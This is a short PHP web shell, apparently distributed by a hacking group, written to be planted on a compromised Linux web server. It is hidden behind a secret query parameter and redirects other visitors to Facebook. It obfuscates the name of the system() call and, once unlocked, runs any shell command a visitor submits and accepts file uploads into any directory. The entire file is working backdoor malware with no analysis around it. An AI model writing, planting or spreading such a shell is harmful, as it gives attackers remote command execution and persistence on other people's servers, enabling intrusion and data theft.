<?php
/*
AUTHOR : AZZATSSINS CYBERSERKERS
^_^ Change © Not make you a hacker
*/
@ini_set('display_errors', 0);
set_magic_quotes_runtime(0);
if($_GET['mother']=='fucker'){
$azx=str_replace('17081945','s','17081945y17081945tem');
$pewde  = str_replace("\\\\","\\",$_POST['cewede']);
$cemde = str_replace("\\\\","\\",$_POST['cemde']);
$UName  = `uname -a`;
$azz   = `pwd`;
$uid = `id`;

if($pewde == ""){
$pewde = $azz;
}
echo "<title>Simple LinuNix WebShell</title><body bgcolor=silver><b>Server : ".$UName."<br>ID : ".$uid."<br><hr><br>";

if($_POST['azzatssins'] == "List") {
$cemde = "ls -la";
}
echo "<br><fieldset><center><form method=post enctype=multipart/form-data>Command:<input name=cemde value=".$cemde."><input type=submit name=azzatssins value=Run><br><fieldset>Change directory:</b><input name=cewede value=".$pewde."><input type=submit name=azzatssins value=List></fieldset><br>Upload file:<input type=file name=file><input type=submit value=Upload><br></fieldest>";

$cemde = str_replace("\\\"","\"",$cemde);
$cemde = str_replace("\\\'","\'",$cemde);
  
if(@copy($_FILES['file']['tmp_name'], $pewde.'/'.$_FILES['file']['name'])){
echo '<center>Success!<br>'.$pewde.'/'.$_FILES['file']['name'].'</center><br>';
}
echo "</center><br><fieldset><pre>";
$cemde = "cd ".$pewde.";".$cemde;
$azx($cemde);
echo "</pre></fieldset><br>";


}else{ echo'<meta http-equiv="Refresh" content= "0; url=http://fb.com">';}